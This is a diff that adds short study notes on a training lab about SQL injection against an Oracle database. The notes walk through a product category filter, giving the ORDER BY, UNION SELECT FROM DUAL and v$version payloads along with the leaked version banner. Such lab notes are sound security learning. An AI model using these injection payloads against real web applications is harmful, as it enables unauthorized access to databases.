@@ -1,0 +1,28 @@
+Lab #7 SQL injection attack, querying the database type and version on Oracle
+
+SQL Injection - Product category fitter
+
+End Goal display the database version string
+Analysis:
+-------------------------------------------------------
+
+Steps:
+
+1. Determine the number of columns.
+    use order by clause.
+
+' order by 3--      => Internal server Error
+
+columns = 2
+
+2. Determine the data types of the columns.
+
+' UNION select 'a', 'a' from DUAL--     => Its an Oracle database therefore the syntax has changed according to the database.
+
+3. Output the version of the database.
+
+SELECT banner from v$version    => Method used in Oracle database to find out the version.
+
+' UNION select banner, NULL from v$version--
+
+    Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
